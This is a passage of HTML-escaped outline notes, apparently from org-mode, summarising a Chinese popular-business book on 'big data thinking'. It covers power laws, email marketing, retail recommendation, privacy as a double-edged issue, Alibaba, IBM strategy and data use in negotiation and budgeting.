&lt;li&gt;移动说，搞了这么多年，今年才发现，腾讯才是我们的竞争对手。一个小小的微信软件运用，给了电话和短信致命性的一击！&lt;/li&gt;
&lt;li&gt;国内最大的免费安全平台360互联网安全中心能够颠覆传统杀毒软件市场，成为No.1。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;诸多残酷的现实告诉我们：如果还停留在过去，不懂得转变，那只能被大数据时代淘汰！&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdc9c862&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgdc9c862&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.3&lt;/span&gt; 量变思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-3&quot;&gt;
&lt;p&gt;
信息总量的变化导致了信息形态的变化，也就是量变引发了质变。大数据也一样，量变导致质变。
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;计算机数据处理能力的增长速度非常快，快得令人咂舌。这个速度比世界经济的增长速度还要快九倍；&lt;/li&gt;
&lt;li&gt;人类存储信息量的增长也迅速增长，比世界经济的增长快四倍；&lt;/li&gt;
&lt;li&gt;曾经，欧洲的信息存储量用了50年才增长了一倍，如今每三年就能增长一倍。&lt;/li&gt;
&lt;li&gt;在金融领域，美国股市每天的成交量高达70亿股，Facebook每天更新的照片量超过1000万张，每天，人们会在网站上点击“喜欢”按钮或写评论约30亿次，谷歌公司每天要处理超过24拍字节的数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgcd22369&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgcd22369&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.4&lt;/span&gt; 优劣思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-4&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;事物都是一分为二的，有优势，也有劣势，大数据也是如此。&lt;/li&gt;
&lt;li&gt;大数据的劣势。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;首先，大数据存在隐私泄露的情况。&lt;/li&gt;
&lt;li&gt;其次，大数据只能发现过去，不能左右未来。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org5e853f2&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org5e853f2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.5&lt;/span&gt; 冲击思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-5&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;大数据的冲击力体现在哪些具体方面：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个方面，大数据正在以无限的增长方式突破有限的增长。&lt;/li&gt;
&lt;li&gt;第二个方面，大数据正在以效益递增突破。&lt;/li&gt;
&lt;li&gt;第三个方面，大数据是和谐共赢的，它突破了对立和矛盾的发展。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;互联网的时代，你需要互联网思维，当然不是那种越来越“玄”的互联网思维，而是一种回归常识的互联网思维。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org5289e45&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org5289e45&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;4&lt;/span&gt; 新数据时代的新思维&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-4&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org57b9f68&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org57b9f68&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.1&lt;/span&gt; 幂律思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;幂律是大数据所遵循的基本定理，什么是幂律？它指的是几何平均定值，如有一万个连线的大节点有十个，有一千个连线的中节点有一百个，一百个连线的小节点有一千个……在对数坐标上画出来会得到一条斜向下的直线。&lt;/li&gt;
&lt;li&gt;幂律和爆发点的相伴相生&lt;/li&gt;
&lt;li&gt;爆发改变了一切&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org5c9601c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org5c9601c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.2&lt;/span&gt; 效率思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;大数据的精准和效率&lt;/li&gt;
&lt;li&gt;大数据能掌控电视剧收视率&lt;/li&gt;
&lt;li&gt;大数据还能追女朋友&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9d49bca&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org9d49bca&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.3&lt;/span&gt; 邮件思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;邮件思维是什么？是在用户默许的情况下，通过电子邮件的方式向用户传递有价值信息的一种营销手段。营销手段是利用邮件与用户、客户进行商业交流的一种直销方式。&lt;/li&gt;
&lt;li&gt;会员才是邮件营销的核心，与传统的纸质邮件相比，邮件营销更高效、更快捷。&lt;/li&gt;
&lt;li&gt;大数据时代的邮件营销
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;邮件营销最注重的是数据信息的收集和整合，各行各业都希望用“短平快”的方式，直接购买邮件地址，不断地给用户或客户发送营销邮件，从而明确目标群，获得订单。但这种营销的效果越来越不明显。&lt;/li&gt;
&lt;li&gt;由于多年来在邮件营销领域的经验和积累，webpower获得了海量的用户数据信息。通过对这些数据的分析和整理，webpower将为客户带来昂贵的价值。在大数据技术的支持和帮助下，webpower可以针对用户点击的内容进行深入分析和挖掘，为其制定个性化的邮件策略。此外，webpower还可以对用户使用邮箱的历史数据，设定为触发式邮件。在必要的时候，可以启用短信、微信等参与进来，提醒用户哪些是有价值的营销邮件。&lt;/li&gt;
&lt;li&gt;邮件营销与网络营销、数据库营销以及新媒体等的结合越来越紧密。如何提升邮件营销给企业带来更大的价值，是IT行业急需探索的问题。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgd36a1d6&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgd36a1d6&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.4&lt;/span&gt; 定位思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-4&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;网站零售在挖掘顾客喜好时运用了两种方式。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一种方式是从消费者的购买行为上来判断他们之间相同的地方。比如，当你在网上买电子产品时，网站就会跳出对话框或在网页下端提醒你—购买这款电子产品的人也购买了其他哪些电子产品。就是这样，网站零售商找到了“人以群分”的结合点。&lt;/li&gt;
&lt;li&gt;第二种方式是从商品上入手，网络零售商通过判断商品之间的关联性推荐给消费者。比如，你想要买一件裤装，网站就会推荐一款T恤或衬衫，从而找到“物以类聚”的结合点。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;余额宝的成功，最重要的就是定位准确。天弘基金副总经理，增利宝余额宝项目组组长周晓明此前曾表示：“小公司走老路，干是找死，不干是等死。穷则思变，中小公司一定要创新。”&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orga247018&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orga247018&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.5&lt;/span&gt; 逆向思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-5&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;股神巴菲特有这样的一句名言：别人贪婪时我恐惧，别人恐惧时我贪婪。换句话理解，就是人们需要有一种逆向思维，这也是对创新的另一种理解。&lt;/li&gt;
&lt;li&gt;IBM公司曾经是世界上最大的计算机公司，也曾是世界上经济效益最好的计算机公司。1985年，IBM公司的通用大型机毛利率高达85%，中小型机毛利率高达50%，占世界通用大中型计算机市场的70%。到了20世纪80年代后期开始，计算机开始向小型化的个人电脑发展。到了1993年，IBM公司连续亏损，亏损的金额高达168亿美元。为了集中精力进行硬件开发，IBM公司就把个人电脑的操作系统授权给了微软公司。随着IBM个人电脑兼容机的大规模普及，微软和英特尔占据了个人电脑产业系统的核心位置，而IBM硬件则逐渐被边缘化了。&lt;/li&gt;
&lt;li&gt;苹果公司运用逆向思维，另辟蹊径，用一种全新的方式建立了新的产业形态，撼动了微软和英特尔的领导地位。&lt;/li&gt;
&lt;li&gt;逆向思维运用得好，就会将缺点变成优点，把不可能变成可能。&lt;/li&gt;
&lt;li&gt;纵观这些企业之间的竞争和案例，无不告诉我们这样一个道理：“当你面对强手的时候，千万不要被对方牵着鼻子走，而是寻找到自己的节奏，迈出适合自己的步伐，脚踏实地，并懂得“想他人所想不到，做他人所做不到”。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgd6bb076&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgd6bb076&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;5&lt;/span&gt; 大数据能量的积累与爆发&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-5&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgb98eb51&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgb98eb51&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;5.1&lt;/span&gt; 关联思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-5-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;从数据中寻找出一定的相关关系，通过这种关系，大数据会做出预测，从而告诉大众结果。这就是大数据方法论的核心思想。&lt;/li&gt;
&lt;li&gt;麻省理工学院气象学家洛伦兹曾向人们介绍过一种现象—“蝴蝶效应”。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;一只南美洲亚马孙河流域热带雨林中的蝴蝶，偶尔扇动几下翅膀，两周后，美国得克萨斯州掀起了一场龙卷风。从表面上看来，似乎这之间毫无关系，但结果告诉我们，即使是微小的事情也极有可能与千里之外的一件事情发生关联，并带来改变。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1f93c4c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org1f93c4c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;5.2&lt;/span&gt; 双刃思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-5-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;“大数据时代”的隐患：只要你在网络上活动，无论你在做些什么，都会被“记录在案”，甚至不知在什么地方，又以哪种形式被人揪出来。更可悲的是，你想不想出来的主动权不是由自己说了算，而是由网络运营商来决定。&lt;/li&gt;
&lt;li&gt;“大数据”是一把双刃剑，人们在享受大数据带来的机遇时，也不得不面临一个残酷的问题，以及可能爆发的大数据危机。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1bba263&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org1bba263&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;5.3&lt;/span&gt; 价值思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-5-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;“大数据”真的那么具有吸引力吗？
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;网络用户每点击一次鼠标，每一次刷卡消费，都已经参与了数据的生成。可以说，每一个用户都是数字的生产者和消费者。&lt;/li&gt;
&lt;li&gt;凭借如此精细的监测手段，完全可以知道一个人或一辆车的行踪，从而产生精细化的数据，用以描述各种物体、社会和整个环境的行为。有了这些数据，大大减少了社会的复杂度。&lt;/li&gt;
&lt;li&gt;在商业领域，一家美国的公司已经利用大数据，在亚马逊的云平台上处理跟天气相关的信息，从而帮助农业种植者保障自己的收益。对企业数据信息的深度挖掘和分析，能够对经济运行的状况进行准确的预警，从而做出正确的应对决策。&lt;/li&gt;
&lt;li&gt;在金融领域方面，大数据分析师都已经成为在美国华尔街基金股票分析和高频数据交易等领域最抢手的人才；在中国，阿里巴巴集团旗下的金融业务，也开始用大数据来发放“信用贷款”。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;大数据时代带来了比以往机会更大的发展空间。这包括以下几个方面：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个方面，是技术创新的新空间。&lt;/li&gt;
&lt;li&gt;第二个方面是商业模式的创新。&lt;/li&gt;
&lt;li&gt;第三个方面是信息资产的经营。&lt;/li&gt;
&lt;li&gt;第四个方面是客户关系管理。&lt;/li&gt;
&lt;li&gt;第五个方面是个性化精准推荐。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1793406&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org1793406&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;6&lt;/span&gt; 大数据引导的商业变革&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-6&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdfca7c8&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgdfca7c8&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.1&lt;/span&gt; 知识思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;“核心竞争力”这一理念，是由美国学者普拉哈德和哈默提出的。他们把其定义为：组织中的积累性学识，特别是关于如何协调不同的生产技能和有机结合多种技术流派的学识。&lt;/li&gt;
&lt;li&gt;大数据的核心是思想，不是技术。&lt;/li&gt;
&lt;li&gt;端到端是一个面向大数据的解决方案。英特尔的理念是在这个解决方案里实现数据价值的挖掘。所谓“端到端”，前端视频采集、分析、存储，及后端数据中心处理等。&lt;/li&gt;
&lt;li&gt;总而言之，知识经济才是提高核心竞争力的有效途径。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;首先，知识经济时代可以识别企业核心知识，并提高企业的创新能力。&lt;/li&gt;
&lt;li&gt;其次，信息化建设可以使知识管理更有效地进行，提高企业的核心竞争力。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1bebe9c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org1bebe9c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.2&lt;/span&gt; 变革思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;大数据的价值不言而喻，但也有着两面性。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;大数据催生了一批新型科技公司，吸纳科技人才就业，并为企业发展转型提供了新机遇；&lt;/li&gt;
&lt;li&gt;另外一方面，大数据给个人、企业乃至国家带来了一些危机，如隐私、重构信息安全、竞争力差距拉大以及数据产权争端等问题。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;大数据改变了人们的生活，塑造出了不同的个性化思维。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;比如，人们白天在电脑前浏览网页或下个订单，第二天就能收到自己想要的东西；晚上出门消费，不再是给现金，而是刷卡；看电影也不再苦苦排队，而是提前团购或预订……由此，人们的行为举止都会被记录下来，从而产生数据&lt;/li&gt;
&lt;li&gt;再比如，气候公司会根据各个城市的气温高低、降雨量、土壤的状况和往年的农作物产量等情况，预测出第二年农场的产量，甚至还向农户出售个性化保险；&lt;/li&gt;
&lt;li&gt;阿里巴巴集团根据在淘宝网上中小企业的交易状况，筛选出财务健康和讲究诚信的企业，为其发放无须担保的贷款。&lt;/li&gt;
&lt;li&gt;再举个例子：我们得到了一个人的短信和通话数据、他微博的内容数据、医保和社保的数据，还有城市交通数据、签到数据、社交关系数据等。通过这些数据，我们就能对这个人形成深刻的认识，从而为其打造出完全个性化的服务。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;百度大数据关于技术方面的事例
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;百度大数据开放平台&lt;/li&gt;
&lt;li&gt;百度工业革命&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org4056943&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org4056943&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.3&lt;/span&gt; 生产思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;人类的行为是否可以被预测？&lt;/li&gt;
&lt;li&gt;如何运用“私人定制”思维？&lt;/li&gt;
&lt;li&gt;大数据“定制化”需得具备几个条件：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;首先，要有海量的数据；&lt;/li&gt;
&lt;li&gt;其次，这些数据能够挖掘出对生产商家有价值的信息；&lt;/li&gt;
&lt;li&gt;再次，具备挖掘这样的数据的技术能力；&lt;/li&gt;
&lt;li&gt;最后，要有能力整合生产、流通和销售这些关键环节。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2e83291&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org2e83291&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.4&lt;/span&gt; 自动化思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-4&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;关于信息安全，大数据作出的最大贡献就是通过自动化分析处理与深度挖掘，将亡羊补牢式的处理，转向还没有发生前的自动化评估预测和应急措施。&lt;/li&gt;
&lt;li&gt;大数据解析航空安防和自动化
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;首先，从目前来说，飞机是地球上最安全的旅行交通工具，比其他交通工具，如汽车、火车等安全级别高很多。&lt;/li&gt;
&lt;li&gt;其次，飞机发生事故所造成的社会影响比其他交通工具发生事故造成的社会影响更大。&lt;/li&gt;
&lt;li&gt;再次，国外的一些专家经过研究得出了一个结论，那就是：国际航班比国内航班出事故的概率要低一些。其实并非如此，所有国家的航班出现事故的概率都相差无几，并不是发达国家的国际航班就更安全一些。&lt;/li&gt;
&lt;li&gt;最后，飞行过程中的安全概率是根据起飞和爬升到巡航高度，以及下降和着陆来决定的。当然了，这也是飞行中最容易出问题的地方。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org71588dc&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org71588dc&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.5&lt;/span&gt; 导向思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-5&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;新生的婴儿在第一时间就得学会哭泣；上学时，坐进教室的第一时间就得知道上什么课，拿什么书；进入高中后，必须规划今后的人生，上什么学、学什么专业、找什么样的姑娘或嫁什么样的男人，从事什么工作……这些，都需要一个导向思维，如果仅仅靠得过且过，明天的事明天说，犹如行尸走肉一般，一生将无建树。当然，绝大多数的人们，不会甘于现状，苛求发展，即使没有真正发展，也在内心存在这样的渴望，并独自努力。&lt;/li&gt;
&lt;li&gt;有了导向思维后，一切才会有规律地发展和进步，无论成功与否，其占据的位置都是其他特长所无法替代的。就好比当下就很火爆的阿里巴巴集团旗下的淘宝、天猫等，如果不是因马云的导向思维，怎么会有今天的互联网地位？&lt;/li&gt;
&lt;li&gt;马云的故事
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;“作为一个创业者，首先要给自己一个梦想。1995年我偶然有一次机会到了美国，然后我看见了、发现了互联网。我对技术几乎不懂，到目前为止，我对电脑的认识还是部分停留在收发邮件和浏览页面上。但是这并不重要，重要的是你到底有什么梦想。”&lt;/li&gt;
&lt;li&gt;在创业前，马云已经不缺钱了，至少是不缺吃饭的钱。在那个年代，马云是一名外语教师，还开了一间翻译社，又做夜校老师，有多个渠道的收入来源。用今天的话来说，马云已经脱离了蚁族和蜗居的时代，完全是不愁吃喝的公务员的待遇。但是，有了如此安逸闲适的生活之后，马云为何还要出来创业呢？因为，他想要的并不是这些，而是梦想，一个伟大的梦想。&lt;/li&gt;
&lt;li&gt;每个人都会说，我想要环球世界，我想要改变世界，我要让每一个人知道我的存在，为我的成功喝彩。可今天一过，继续过着朝九晚五的生活，在论坛或好友群吐槽工作的不易、上司不懂慧眼识英雄，闲时睡大觉、打游戏、三五好友瞎侃……如果你永远这样，那么你的导向思维没有起到任何作用，而仅仅是一个想法。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;IBM大数据战略导向认知计算
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;2014年3月，在IBM公司大数据新闻发布会上，IBM大中华区大数据和分析及新市场总经理，全球企业咨询服务部合伙人Jason Kelley宣布：“2014年，IBM大数据战略将持续升级在大数据方向的投入。IBM将继续深入在金融、电信、医疗、零售、制造等各行业的实践；并增强大数据与分析与云计算、移动、社交等热点趋势的融合，以及实现认知分析与大数据应用的不断融合。”&lt;/li&gt;
&lt;li&gt;IBM大中华区大数据中心总监王晓梅说：“在未来的大数据与分析实践中，IBM将进一步帮助企业把分析注入关键业务流程，从‘六大要务’角度解析业务需求，并导出对应的大数据与分析战略蓝图。当前，我们将重点推行该六大要务中对于客户洞察和流程革新的指导，帮助企业通过使用社交媒体分析等进行客户关系管理、市场营销决策，通过利用预测性维护、实时预警等进行财务等运营流程的优化。”&lt;/li&gt;
&lt;li&gt;从2005至今，IBM公司并购了35家以上的公司，比如，高速文件传输工具Aspera、IBM收购数据分析软件公司The Now Factory和备受关注的DaaS供应商Cloudant。综上所述，没有导向思维，就没有前进的动力和方向。没有大数据导向思维，就没有成功的可能性。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org12d5046&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org12d5046&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;7&lt;/span&gt; 大数据的营销策略&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-7&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgd700918&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgd700918&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;7.1&lt;/span&gt; 测量思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-7-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;在进行大数据测试之前，首先要对测试需求做清晰的分析。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;举个例子：假设一个本科院校的学籍管理系统主要是用来管理学生的，学生在系统中的生命周期一般是四年。根据学校现有的在校生数和五年内的每一年的招生数据，就可以分析出需要构造的各个学年下的学生数。接着，对测试需求做准确清晰的分析后，对输入的测试数据进行分析。&lt;/li&gt;
&lt;li&gt;要求主要表现在两方面：一方面要求测试数据与生产环境数据一致。另一方面，就要求测试数据输入要满足输入限制规则，尽量覆盖到满足规则的不同类型的数据。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;问题探讨：到底是什么影响人们的幸福感呢？
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;随着物质生活水平的提高，生活质量越来越得到人们的重视，而且，社会的总体心态与人们的行为准则有着密不可分的联系。一些社会指标告诉人们：最容易产生负面情绪的人群，不一定是生活最困难的人群，而是期望值与自身生活水平差距较大的人群。&lt;/li&gt;
&lt;li&gt;举个例子：关于幸福感的研究，学术界的大多人士都表明，幸福感是一种感觉，并不与财富的多少以及生活水平的高低成正比。社会心理学家曾列过这样的一个公式：期望实现值除以内心的期望值才等于人的情绪指数。期望实现值与内心期望值的比值一旦大于或等于1时，人就会处于一种兴奋的状态，就会感到满足；相反，如果期望实现值与内心期望值的比值小于1时，人就会感到压抑，“唉”声连连，甚至做出一些平时不做的极端事。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgda541c2&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgda541c2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;7.2&lt;/span&gt; 谈判思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-7-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;所谓谈判，说的就是彼此之间，为了实现某种目的而进行的一种意见交换，然后寻找到一个制衡点，寻求问题解决的途径并达成协议的过程。&lt;/li&gt;
&lt;li&gt;在商业谈判中，我们绝对不能忽略数据对谈判结果产生的影响。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;打个比方说，数据就好比是一棵大树的枝叶，而想要与另一棵大树做比较的时候，除了其主干因素外，这些枝叶就是最为明显的可比部分。也就是说，掌控足够多的数据，将在谈判过程中掌控先机。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;如何利用数据在谈判中获得优势呢？
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;掌控绝对的数据&lt;/li&gt;
&lt;li&gt;还要有针对性&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;不利用数据，仅仅依靠过去经验和谈判员的弊端
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;对产品认识不足的情况很容易出现在谈判桌上，从而导致在谈判中失去主导地位。而且，由于这种产品知识比较抽象，将之比喻为对产品以及产品所在行业的市场直觉更为合适。而直觉又往往是很难通过言语表达出来的，这就使得我们很难组织出一套权威的术语来说服对方，所以，就很难赢得对方的认可。&lt;/li&gt;
&lt;li&gt;更为重要的一点是，要想形成产品知识，还和销售人员有着至关重要的关系。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgccda64b&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgccda64b&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;7.3&lt;/span&gt; 预算思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-7-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;在这个时代，财务所面对的数据规模将会越来越大，数据类型也将越来越复杂。那么，如何整理与统计这些杂乱无章的数据，让这些数据能够更直观明了地展现在人们面前，并且为企业管理者的经营决策提供有效的科学依据，则成为现阶段我们必然考虑的问题之一。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;对此问题，业内人士表示，全面预算管理将是让企业大数据“活起来”的最好方式。首先，预算是根据历年的数据和某些调整信息，对未来时期进行分析评测，进而得出的信息。其次，它是由实际业务数据和预算数据相结合与比较之后，而设计出来的一套最佳管理方案。利用这套方案，可以让企业资源得到更充分的利用，从而在未来获得更大的利益回报。&lt;/li&gt;
&lt;li&gt;笼统地说，全面预算管理解决方案是在对企业内外部大数据进行收集、处理、控制、分析、整合等的基础上，与其他工具结合，帮助企业更好地利用数据实现战略落地。&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
